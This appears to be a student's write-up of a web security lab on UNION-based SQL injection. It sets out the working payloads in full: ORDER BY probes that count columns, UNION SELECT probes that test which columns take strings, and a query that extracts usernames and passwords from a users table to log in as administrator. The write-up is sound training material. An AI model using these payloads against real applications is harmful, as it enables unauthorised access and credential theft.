Lab 2: UNION Attack — Retrieving Data from Other Tables

🎯 Objective

Extract usernames and passwords from another table using UNION-based SQL injection.


---

🧠 Thought Process

1. Identify the number of columns returned.


2. Check which columns can hold string data.


3. Use UNION SELECT to retrieve sensitive data from the users table.


4. Log in as the administrator.




---

🔍 Steps Taken

1. Determine number of columns

' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

Result: The query returned 2 columns.

2. Identify string-compatible columns

' UNION SELECT 'abc', NULL --
' UNION SELECT NULL, 'abc' --

Result: Both columns accepted string data.

3. Retrieve data from another table The lab description confirmed the existence of a users table with username and password columns.

' UNION SELECT username, password FROM users --


---

🏁 Result

✅ Retrieved administrator credentials and logged in successfully.


---

📝 Important Note (Real-World Context)

In real-world applications, table and column names are not usually known in advance. They are commonly discovered using:

information_schema enumeration

Error-based SQL injection

Common column name guessing

Source code or API leaks


This lab focuses specifically on mastering UNION-based data extraction logic.


---

🧠 Key Takeaways

UNION attacks allow attackers to extract data from unrelated tables.

Column enumeration and data-type matching are mandatory steps.

Understanding query structure is more important than memorizing payloads.



---

🔥 Progress Status: Strong momentum. Ready for advanced UNION SQL injection labs.
